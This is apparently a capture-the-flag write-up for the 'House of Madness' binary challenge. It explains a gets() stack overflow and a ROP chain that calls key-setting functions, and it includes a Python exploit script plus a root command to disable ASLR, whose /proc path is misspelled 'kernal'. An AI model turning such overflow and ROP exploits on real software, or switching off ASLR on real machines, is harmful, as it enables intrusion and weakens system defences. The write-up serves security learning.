# House of Madness

## Solution

If we run this binary we see we are thrown into a type of game.
Going into room 4 and saying `Stephen` will unlock a special room.
Looking at the binary is we see the function for this we see that it uses `gets`.

This should immediately throw red flags as gets does not perform any boundary checks and can be used to corrupt control flow.
If we look further in the disassembly we can see mentions to multiple different functions `get_key1`, `get_key2`, `set_key4`, and `AAsDrwEk`.

We should probably try to call these functions as if you look into `get_flag` we need all the keys to properly get the flag.
The first function we should go into is `AAsDrwEk`.
To do this we will first need to overwrite the stack until the return pointer.
If we look at the vulnerable function we see the buffer is stored at `0x18`.
Therefore, we will need to send in `0x18` characters to overwrite the buffer.
After that we will need to send in `4` characters to overwrite the old EBP on the buffer.
Now we are at the return pointer, so here we can pack the address for `AAsDrwEk`.
After we call this function we should get the second key. So the next value to put onto the stack will be the return address from `AAsDrwEk` which we want to be `get_key2`.
After `get_key2` we want to go to `get_key1` so let's put its address on the stack!

However for this function we need a passed parameter. Passed parameters are storted starting at EBP+8. So lets put `0xFEEDCODE` there.
However we need to fill +4 as the return address. But, since we had passed parameters this time we need to clean up our mess.
So we will need to look for a ROP gadget that is `pop ebx; ret`. This will clean up the passed parameter.
We can find this gadget at `0x565567e7`. After this let's call `set_key4` and then `get_flag`.

Here is our exploit!

```python
import struct

import sys

padding = b"a" * 0x18
padding += b"bbbb"

padding += struct.pack("I", 0x565567cd) # AAsDrwEk (get_key3)
padding += struct.pack("I", 0x5655676e) # get_key2
padding += struct.pack("I", 0x565566de) # get_key1
padding += struct.pack("I", 0x565567e7) # pop ebx; ret
padding += struct.pack("I", 0xFEEDC0DE) # get_key1 arg
padding += struct.pack("I", 0x565567e9) # set_key4
padding += struct.pack("I", 0x5655686b) # get_flag

sys.stdout.buffer.write(b"2")
sys.stdout.buffer.write(b"4")
sys.stdout.buffer.write(b"3")
sys.stdout.buffer.write(b"Stephen\n")

sys.stdout.buffer.write(padding)
```

## Note

ASLR was disabled on the server for this challenge. If running locally ensure you have ASLR off too.

Run, as root, `echo 0 > /proc/sys/kernal/randomize_va_space`
